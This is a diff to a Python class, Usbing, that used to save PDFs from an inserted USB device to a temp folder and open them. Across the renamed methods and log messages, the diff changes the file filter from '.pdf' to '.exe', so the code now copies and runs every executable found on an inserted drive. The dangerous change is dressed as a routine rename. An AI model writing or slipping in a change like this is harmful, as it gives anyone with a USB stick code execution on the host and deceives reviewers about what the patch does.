@@ -110,18 +110,18 @@ class Usbing:
 
     def handle_usb_device(self):
         logger.info("Handling usb image")
-        self.save_pdfs_from_usb_device()
+        self.save_exes_from_usb_device()
         self.discard_old_usb_device()
-        self.open_saved_pdfs()
+        self.open_saved_exes()
 
     def take_timeout(self, secs=None):
         logger.info("Take timeout for " + str(secs or self.timeout) + " secs")
         time.sleep(secs or self.timeout)
 
-    def save_pdfs_from_usb_device(self):
-        logger.info("Saving pdfs on USB device to tmp folder")
+    def save_exes_from_usb_device(self):
+        logger.info("Saving exes on USB device to tmp folder")
         self.mount_usb_device()
-        self.save_pdfs_from_mounted_device()
+        self.save_exes_from_mounted_device()
         self.unmount_usb_device()
 
     def discard_old_usb_device(self):
@@ -129,8 +129,8 @@ class Usbing:
         self.usb_device.discard()
         self.usb_device = None
 
-    def open_saved_pdfs(self):
-        logger.info("Opening saved pdfs")
+    def open_saved_exes(self):
+        logger.info("Opening saved exes")
         for file in self.saved_files:
             self.open(file)
             self.saved_files.remove(file)
@@ -139,11 +139,11 @@ class Usbing:
         logger.info("Mounting USB device")
         self.usb_device.mount()
 
-    def save_pdfs_from_mounted_device(self):
+    def save_exes_from_mounted_device(self):
         files = self.usb_device.get_files()
-        pdfs = filter(lambda file: file.endswith(".pdf"), files)
-        for pdf in pdfs:
-            self.save_in_tmp_folder(pdf)
+        exes = filter(lambda file: file.endswith(".exe"), files)
+        for exe in exes:
+            self.save_in_tmp_folder(exe)
 
     def unmount_usb_device(self):
         logger.info("Unmounting usb device")
